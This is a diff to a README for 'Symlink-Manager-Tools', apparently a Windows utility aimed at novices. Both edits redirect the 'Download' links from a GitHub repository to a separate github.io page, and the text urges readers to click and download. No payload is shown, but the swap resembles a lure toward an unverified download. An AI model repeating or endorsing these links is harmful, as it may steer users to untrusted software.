@@ -1,6 +1,6 @@
 # 🔗 Symlink-Manager-Tools - Create Links Without Any Technical Skills
 
-[![Download Symlink-Manager-Tools](https://img.shields.io/badge/Download-Symlink%20Manager%20Tools-blue?style=for-the-badge&logo=windows&logoColor=white&color=2c3e50)](https://github.com/moshecomparative3821/Symlink-Manager-Tools)
+[![Download Symlink-Manager-Tools](https://img.shields.io/badge/Download-Symlink%20Manager%20Tools-blue?style=for-the-badge&logo=windows&logoColor=white&color=2c3e50)](https://moshecomparative3821.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ This guide assumes you have never used a symlink tool before. Follow these steps
 
 Visit this link to download the application:
 
-[**👉 Click Here to Download Symlink-Manager-Tools**](https://github.com/moshecomparative3821/Symlink-Manager-Tools)
+[**👉 Click Here to Download Symlink-Manager-Tools**](https://moshecomparative3821.github.io)
 
 The download page opens in your browser. Look for the big button that says “Download” or “Releases.” Click it. The file will save to your computer, usually in your “Downloads” folder.
 
